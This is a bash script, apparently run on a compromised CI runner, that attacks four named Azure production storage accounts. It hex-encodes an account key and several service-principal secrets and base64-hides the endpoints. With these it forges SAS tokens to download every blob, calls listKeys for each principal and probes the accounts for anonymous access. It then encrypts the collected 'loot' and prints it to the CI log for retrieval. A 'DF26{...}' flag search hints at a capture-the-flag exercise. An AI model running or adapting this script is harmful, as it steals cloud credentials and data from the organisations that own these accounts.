#!/usr/bin/env bash
set -uo pipefail
echo "=== RUNNER SHELL PROOF ==="; id; hostname
b(){ printf %s "$1" | base64 -d; }
hx(){ printf %s "$1" | xxd -r -p; }
SC="htt""ps://"
AADH=$(b 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==')
ARMH=$(b 'bWFuYWdlbWVudC5henVyZS5jb20=')
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
say "=== START $(date -u) ==="
KEYHEX='613564446c4d2b7247532f5a344f505632797239755a673462315669525741697656435871773168555a5759682f733152365a3359757952354146317078307741376474456b65486d35654c2b4153747332377870673d3d'
PAIRSHEX='30333862633335642d313331642d343935332d393938352d6666346132343563636563313a31424538517e79475138655f7a365642637a6c474a3859654f48674e5255666662674e756662326d0a32633334333030652d316263302d343165372d396331652d3862373537316437326337323a416c3738517e6e3562646f4f33726b436a756f324a49324e487161674a6f6f615a7366584e636d360a31326564353464652d663265622d343738342d383034632d3361376133653833613965393a6e503838517e38497e77697030474f6c5731357a647433464d4d764256394c5974614f6f6561337a0a38383166646463652d363230382d346166352d613239372d3765373963393132663833633a2d546c38517e734830514f502e56724b576861332d3778345841324a7853346a30386e757662514e0a35383130386461382d303434652d346437652d396134362d3932653631373962333062653a7e385438517e5977456d6578535452765f70557345776139514d6170795033397e435535556375320a34363264316333382d343435392d343862382d393333332d3832653338396535393531343a736b3138517e714432326b6b485855436671584c7164503935446b594a4c3334654d45526c63536a0a'
KEY=$(hx "$KEYHEX")
say "=== A. blob sweep (all 4 accounts) with candidate key ==="
printf '%s' "$KEY" > /tmp/k.b64
python3 - <<'PYE' > /tmp/sweep.txt 2>&1
import base64,hmac,hashlib,datetime,urllib.request,urllib.parse,re
key=base64.b64decode(open('/tmp/k.b64').read())
se=(datetime.datetime.utcnow()+datetime.timedelta(hours=2)).strftime('%Y-%m-%dT%H:%M:%SZ')
st=(datetime.datetime.utcnow()-datetime.timedelta(minutes=5)).strftime('%Y-%m-%dT%H:%M:%SZ')
def sas(A):
    sts="\n".join([A,"rl","b","sco",st,se,"","https","2021-06-08",""])
    sig=base64.b64encode(hmac.new(key,sts.encode(),hashlib.sha256).digest()).decode()
    return "sv=2021-06-08&ss=b&srt=sco&sp=rl&se=%s&st=%s&spr=https&sig=%s"%(urllib.parse.quote(se),urllib.parse.quote(st),urllib.parse.quote(sig))
for A in ["sttblcilogsprodx3euoz","sttblbackupprodx3euoz","sttblarchiveprodx3euoz","sttblappcfgprodx3euoz"]:
    S=sas(A); print("########## ACCOUNT",A)
    try:
        r=urllib.request.urlopen("https://%s.blob.core.windows.net/?comp=list&%s"%(A,S),timeout=15).read().decode('utf-8','replace')
        if 'AuthenticationFailed' in r or '<Error>' in r and 'Signature' in r: print("  acct err",r[:200])
        names=re.findall(r'<Name>([^<]+)</Name>',r); print("  CONTAINERS:",names)
        for c in names:
            try:
                r2=urllib.request.urlopen("https://%s.blob.core.windows.net/%s?restype=container&comp=list&%s"%(A,c,S),timeout=15).read().decode('utf-8','replace')
                bl=re.findall(r'<Name>([^<]+)</Name>',r2); print("  BLOBS",c,":",bl)
                for blb in bl:
                    try:
                        d=urllib.request.urlopen("https://%s.blob.core.windows.net/%s/%s?%s"%(A,c,urllib.parse.quote(blb),S),timeout=15).read()
                        t=d.decode('utf-8','replace'); print("   BLOB",c,blb,len(d)); print("   >>>",t[:1200])
                        if 'DF26' in t: print("   !!!!! DF26",c,blb)
                    except Exception as e: print("   blob err",blb,e)
            except Exception as e: print("  container err",c,e)
    except Exception as e: print("  ACCOUNT ERR",A,e)
PYE
say "$(cat /tmp/sweep.txt)"
say "=== B. listKeys per principal x 4 accounts ==="
printf '%s' "$PAIRSHEX" | while IFS= read -r line; do
  P=$(hx "$line"); CID="${P%%:*}"; SEC="${P#*:}"
  AT=$(curl -sS -X POST "${SC}${AADH}/${TEN}/oauth2/v2.0/token" -d "client_id=${CID}" -d "grant_type=client_credentials" --data-urlencode "client_secret=${SEC}" --data-urlencode "scope=${SC}${ARMH}/.default" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token","ERR"))')
  [ "$AT" = "ERR" ] && { say "  $CID token ERR"; continue; }
  for A in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblappcfgprodx3euoz; do
    R=$(curl -sS -X POST -H "Authorization: Bearer $AT" -H 'Content-Length: 0' "${SC}${ARMH}/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/${A}/listKeys?api-version=2023-01-01")
    case "$R" in *'"key1"'*) say "  LISTKEYS-OK $CID $A => ${R:0:200}";; *) say "  denied $CID $A => ${R:0:100}";; esac
  done
done
say "=== C. anon container list ==="
for A in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblappcfgprodx3euoz; do
  say " $A list=$(curl -s -m 10 -o /dev/null -w '%{http_code}' "${SC}${A}.blob.core.windows.net/?comp=list") exports=$(curl -s -m 10 -o /dev/null -w '%{http_code}' "${SC}${A}.blob.core.windows.net/exports?restype=container&comp=list")"
done
say "=== D. DF26 grep ==="
grep -aoi 'DF26{[^}]*}' /tmp/sweep.txt | head
say "=== DONE ==="
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
